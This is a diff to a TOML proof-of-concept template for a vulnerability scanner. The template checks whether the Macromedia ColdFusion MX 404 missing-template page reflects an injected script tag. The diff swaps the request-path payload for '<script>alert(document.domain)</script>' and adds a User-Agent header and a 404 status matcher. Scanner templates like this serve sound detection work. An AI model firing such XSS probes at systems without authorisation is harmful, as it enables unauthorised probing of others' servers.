@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 ColdFusion MX 缺失模板处理模块是否存在 XSS 反射漏洞。向目标服务器请求不存在的 .cfm 模板文件并在模板名中注入脚本标记，若服务器在 404 错误页面中未过滤直接反射该模板名称，则说明存在 XSS 漏洞。"
+description = "探测 ColdFusion MX（6.0）404 错误页面是否未对请求路径中的特殊字符进行过滤，导致模板缺失页将未转义内容回显，验证跨站脚本（XSS）漏洞。构造指向不存在模板的请求，其中嵌入 XSS 载荷，若响应正文在 404 错误信息中原样回显恶意脚本特证字符串，则判定存在漏洞。"
 id = "POC-AVE-2002-0656"
-name = "Macromedia ColdFusion MX 缺失模板 XSS 跨站脚本漏洞 PoC"
+name = "Macromedia ColdFusion MX Missing Template Cross-Site Scripting PoC"
 severity = "medium"
 tags = ["ave-2002-0656"]
 vuln_id = [
@@ -15,11 +15,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/nonexistent_<script>alert(1)</script>.cfm"
+path = "/{{BaseURL}}/missing_ave_0656<script>alert(document.domain)</script>.cfm"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["<script>alert(1)</script>"]
+words = ["missing_ave_0656<script>alert(document.domain)</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [404]
+type = "status"
